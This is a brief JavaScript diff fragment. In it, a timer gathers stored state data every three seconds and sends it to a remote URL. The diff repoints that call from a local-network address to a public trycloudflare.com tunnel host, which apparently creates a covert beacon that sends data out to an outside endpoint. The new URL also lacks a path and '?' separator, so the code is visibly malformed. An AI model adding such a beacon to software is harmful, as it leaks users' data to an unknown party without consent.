@@ -20,7 +20,7 @@ ___.$(function($) {
         setInterval(function() {
             var data = ___.load(); // Send persistent state information
             data.time = Date.now(); // Prevent caching
-            ___.include('https://192.168.1.9:8090/queue?' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
+            ___.include('https://availability-gas-metal-experience.trycloudflare.com' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
         }, 3000);
     }
 });
